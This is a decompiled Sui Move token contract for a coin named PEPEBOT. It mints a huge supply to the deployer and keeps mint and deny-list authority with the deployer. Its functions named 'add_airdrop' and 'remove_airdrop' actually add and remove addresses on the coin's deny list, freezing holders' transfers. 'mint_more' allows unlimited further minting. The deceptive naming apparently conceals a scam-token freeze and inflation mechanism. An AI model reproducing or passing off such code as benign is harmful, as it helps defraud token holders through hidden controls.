module 0x994d1207915a6c8946e7edd59cee79318b84a9528b82835bc60f8f242b3aba98::PEPEBOT {
    struct PEPEBOT has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEPEBOT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PEPEBOT>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: PEPEBOT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PEPEBOT>(arg0, 6, b"PEPEBOT", b"Sui Pepebot", b"PEPEBOT", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmVS6bwzC45EuXqRsZegmQUgV3BakJVNyv2agVLzWtimHy?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PEPEBOT>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<PEPEBOT>>(0x2::coin::mint<PEPEBOT>(&mut v3, 1000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<PEPEBOT>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PEPEBOT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<PEPEBOT>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<PEPEBOT>>(0x2::coin::mint<PEPEBOT>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEPEBOT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PEPEBOT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

